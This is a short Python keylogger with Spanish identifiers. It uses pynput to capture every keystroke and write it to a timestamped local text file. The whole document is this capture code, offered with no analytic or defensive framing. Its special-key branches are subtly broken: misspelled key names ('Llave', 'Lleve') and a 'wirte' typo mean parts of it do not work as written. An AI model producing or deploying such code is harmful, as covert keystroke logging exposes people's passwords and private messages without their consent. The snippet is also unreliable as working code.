import datetime
from pynput.keyboard import Listener

x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')

p = open(f'registro_{x}.txt', 'w')

def registro(llave):

    llave = str(llave)

    if llave == "'\\x03'":
        p.close()
        quit()
    elif llave == 'Llave.enter':
        p.write('\n')
    elif llave == 'Lleve.space':
        p.wirte(' ')
    elif llave == 'Lleve.backspace':
        p.write('%BORRAR%')
    else:
        p.write(llave.replace("'",""))

with Listener(on_press=registro) as u:
    u.join()